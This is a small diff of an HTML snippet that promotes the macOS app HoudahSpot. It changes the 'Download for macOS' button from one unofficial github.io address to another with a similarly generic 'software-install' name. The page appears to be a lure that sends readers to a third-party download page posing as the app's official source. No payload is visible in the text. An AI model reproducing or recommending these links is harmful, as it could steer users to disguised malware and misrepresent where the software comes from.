@@ -6,7 +6,7 @@
 <h3>HoudahSpot for macOS</h3>
 <p>HoudahSpot Mac Edition extends Spotlight with saved searches, templates and a flexible results grid for serious file hunters.</p>
 
-<a href="https://mac-software-install.github.io/.github/HoudahSpot">
+<a href="https://software-install-apps.github.io/.github/HoudahSpot">
   <img src="https://i.postimg.cc/4NYk88tL/219133640-8b7a0179-20a7-4e02-8887-fbbd2eaad64b.png" width="200" alt="Download for macOS"/>
 </a>
 </div>
